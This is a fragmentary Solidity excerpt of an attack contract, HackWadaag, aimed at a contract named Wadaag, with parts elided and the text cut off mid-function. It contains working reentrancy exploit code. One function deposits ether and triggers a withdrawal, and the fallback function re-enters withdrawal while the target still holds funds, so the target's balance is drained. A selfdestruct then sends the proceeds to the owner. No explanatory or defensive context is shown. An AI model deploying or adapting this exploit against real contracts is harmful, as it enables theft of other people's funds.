...
contract HackWadaag {
    ...
    constructor(address _waad) public payable {
        owner = msg.sender;
        waad = Wadaag(_waad);
    }
    ...
    function kill () public Owner {
        selfdestruct(msg.sender);
    }
    
    function getEhter() public payable Owner {
        uint256 value = msg.value;
        waad.deposit.value(value)();
        waad.withdrawal();
    }
    
    function() external payable {
        uint256 balance = address(waad).balance;
        uint256 value = msg.value;
        if(balance >= value) {
             waad.withdrawal();
        }
